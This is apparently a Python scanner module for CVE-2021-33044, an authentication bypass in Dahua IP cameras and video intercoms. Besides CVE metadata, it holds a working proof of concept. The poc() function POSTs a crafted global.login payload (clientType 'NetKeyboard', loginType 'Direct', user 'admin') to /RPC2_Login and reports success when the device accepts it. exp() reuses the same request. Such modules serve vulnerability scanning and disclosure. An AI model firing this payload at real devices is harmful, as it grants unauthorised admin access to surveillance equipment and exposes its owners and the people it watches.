import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Dahua IPC/VTH/VTO devices Authentication Bypass''',
        "description": '''The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.''',
        "severity": "critical",
        "references": [
            "https://github.com/dorkerdevil/CVE-2021-33044", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-33044", 
            "https://seclists.org/fulldisclosure/2021/Oct/13"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-33044",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["dahua", "cve", "cve2021", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/RPC2_Login"""
        method = "POST"
        data = """{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}"""
        headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""result":true""" in resp0.text and """id""" in resp0.text and """params""" in resp0.text and """session""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url